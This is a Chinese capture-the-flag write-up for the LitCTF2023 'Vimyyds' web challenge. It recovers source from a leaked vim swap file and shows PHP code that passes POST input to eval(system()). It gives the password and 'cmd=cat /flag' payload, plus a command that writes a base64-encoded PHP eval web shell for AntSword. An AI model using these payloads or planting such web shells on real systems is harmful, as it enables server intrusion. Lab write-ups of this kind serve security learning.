---
title: "Web 6 [LitCTF2023]Vimyyds"
published: 2024-12-01
category: CTF
---

题目涉及 vim，说明有 vim 相关的泄露。

![](https://pic.npiter.de/file/1771547725487_20260220083518079.png)

## Vim 泄露知识

搜索相关资料：

![](https://pic.npiter.de/file/1771547725720_20260220083518077.png)

vim 在编辑文件时会生成 `.swp` 交换文件，若程序异常退出则该文件会保留在服务器上，可通过访问 `.index.php.swp` 下载。

## 下载并恢复 swp 文件

访问 `.index.php.swp` 后会自动下载文件，在 Kali 上用 vim 恢复：

![](https://pic.npiter.de/file/1771547731593_20260220083518080.png)

```bash
vim -r index.php.swp
```

![](https://pic.npiter.de/file/1771547742059_20260220083518081.png)

![](https://pic.npiter.de/file/1771547747759_20260220083518082.png)

恢复后得到源码片段：

```php
if ($_POST['password'] === base64_encode($password)) {
    echo "Oh You got my password!";
    eval(system($_POST['cmd']));
}
```

## 找到密码

![](https://pic.npiter.de/file/1771547755547_20260220083518084.png)

源码中 `$password` 的值为 `Give_Me_Your_Flag`，需要将其 base64 编码后作为 `password` 参数发送。

## 用 HackBar 发送 POST 请求

![](https://pic.npiter.de/file/1771547752996_20260220083518083.png)

第一次尝试出了问题：

![](https://pic.npiter.de/file/1771547755929_20260220083518085.png)

重新传一遍：

![](https://pic.npiter.de/file/1771547764977_20260220083518086.png)

参数：
- `password=R2l2ZV9NZV9Zb3VyX0ZsYWc=`（`Give_Me_Your_Flag` 的 base64）
- `cmd=cat /flag`

## Flag

**`NSSCTF{c39b484e-3955-43a2-b57e-1768857cae2c}`**

## 别的师傅的方法（蚁剑）

写入 webshell：

```
password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&cmd=echo "PD9waHAgZXZhbCgkX1BPU1RbY2NdKTs/Pg==" | base64 -d >cc.php
```

然后用蚁剑连接 `http://node6.anna.nssctf.cn:28516/cc.php`，密码为 `cc`。

## 总结

- vim `.swp` 文件泄露源码
- 从源码中找到密码逻辑，构造正确的 POST 请求
- 使用 HackBar 方便发送 POST 请求
